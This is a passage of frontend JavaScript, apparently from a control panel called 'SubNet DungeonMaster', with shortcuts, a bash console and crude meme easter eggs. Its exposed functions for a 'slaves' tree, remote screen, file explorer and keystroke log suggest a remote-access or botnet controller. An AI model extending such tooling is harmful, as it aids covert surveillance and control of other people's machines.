      if (explorerOpenPath) { closeExplorerViewer(); e.preventDefault(); return; }
      return;
    }

    // Ctrl+L → bash focus
    if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
      if (!app.hidden) {
        e.preventDefault();
        switchPage('bash');
        setTimeout(() => bashInput.focus(), 30);
      }
      return;
    }

    if (isTypingTarget(e.target)) return;
    if (app.hidden) return;
    if (e.ctrlKey || e.metaKey || e.altKey) return;

    const k = e.key;
    if (k >= '1' && k <= '6') {
      const page = PAGE_ORDER[Number(k) - 1];
      if (page) { switchPage(page); e.preventDefault(); }
      return;
    }
    if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
    if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
  });

  // ─── EXPOSE ────────────────────────────────────────────────
  window.setAuthenticated = setAuthenticated;
  window.setMaximized = setMaximized;
  window.sendAnnounce = sendAnnounce;
  window.setSlavesTree = setSlavesTree;
  window.setInfo = setInfo;
  window.setScreen = setScreen;
  window.appendBash = appendBash;
  window.clearBash = clearBash;
  window.setLoginError = setLoginError;
  window.setSlaveState = setSlaveState;
  window.setLocal = setLocal;
  window.setExplorerPath = setExplorerPath;
  window.setExplorerFile = setExplorerFile;
  window.setKeyLog = setKeyLog;

  window.DM = {
    setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo, setScreen,
    appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog
  };

  // ─── GACHI EASTER EGGS (frontend only) ─────────────────────
  const GACHI_QUOTES = [
    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
  ];
  function gachiToast(msg) { sendAnnounce(msg, 'success'); }

  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
  let kIdx = 0;
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === konami[kIdx]) {
      kIdx++;
      if (kIdx === konami.length) {
        kIdx = 0;
        document.body.classList.toggle('gachi-mode');
        gachiToast(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form');
      }
    } else {
      kIdx = e.keyCode === konami[0] ? 1 : 0;
    }
  });

  const logoMark = document.getElementById('logo-mark') || $('.logo-mark');
  let logoClicks = 0, logoTimer = null;
  if (logoMark) {
    logoMark.style.cursor = 'pointer';
    logoMark.addEventListener('click', () => {
      logoClicks++;
      clearTimeout(logoTimer);
      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
      if (logoClicks >= 7) {
        logoClicks = 0;
        gachiToast(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]);
      }
    });
  }

  const BASH_SECRETS = {
    'boss of this gym': 'You are now boss of this gym',
    'ass we can': 'YES WE CAN',
    'thank you sir': 'You are welcome, master',
    '300 bucks': 'Invoice sent to the dungeon',
    'gachi': null,
    'lotion': 'Application requires elevated privileges',
  };
  bashInput.addEventListener('keydown', (e) => {
    if (e.key !== 'Enter') return;
    const raw = bashInput.value.trim();
    const cmd = raw.toLowerCase();
    if (!(cmd in BASH_SECRETS)) return;
    e.stopImmediatePropagation();
    e.preventDefault();
    const msg = BASH_SECRETS[cmd] === null
      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
      : BASH_SECRETS[cmd];
    appendBash(raw, 'cmd');
    pushBashHistory(raw);
    bashHistoryIdx = -1;
    bashInput.value = '';
    appendBash(msg, 'sys');
    gachiToast(msg);
  }, true);

  try {
    console.log('%c♂ SubNet DungeonMaster', 'color:#c9a227;font-size:14px;font-family:monospace');
  } catch (_) {}

  updateNoSlaveHint();
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initCodeMirror);
  else initCodeMirror();
})();